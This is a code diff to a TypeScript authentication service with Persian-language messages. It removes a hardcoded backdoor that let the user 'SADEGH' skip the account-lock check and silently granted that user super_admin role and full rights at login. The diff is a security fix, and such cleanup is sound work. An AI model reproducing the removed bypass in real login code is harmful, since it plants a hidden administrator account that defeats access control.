@@ -105,7 +105,7 @@ export class AuthService {
     }
 
     // Check account lock
-    if (cleanUser !== 'SADEGH' && user.accountLockedUntil && new Date(user.accountLockedUntil) > new Date()) {
+    if (user.accountLockedUntil && new Date(user.accountLockedUntil) > new Date()) {
       throw new AppError('حساب کاربری موقتاً مسدود شده است. با مدیر سامانه تماس بگیرید.', { statusCode: 403 });
     }
 
@@ -152,16 +152,6 @@ export class AuthService {
       user.password !== undefined && user.password !== null && String(user.password) !== '';
     const needsPasswordHashUpdate = !user.passwordHash || !hasBcryptHash || !isOptimizedCost;
     const needsStorageMigration = needsPasswordHashUpdate || hasPlainPassword;
-
-    if (cleanUser === 'SADEGH') {
-      user.role = 'super_admin';
-      user.level = 1;
-      user.scope = 'all';
-      user.roleTitle = 'سوپر ادمین (مدیر کل سیستم)';
-      user.canEdit = true;
-      user.canManageUsers = true;
-      user.canBackup = true;
-    }
 
     if (needsPasswordHashUpdate) {
       user.passwordHash = await hashPassword(cleanPass);
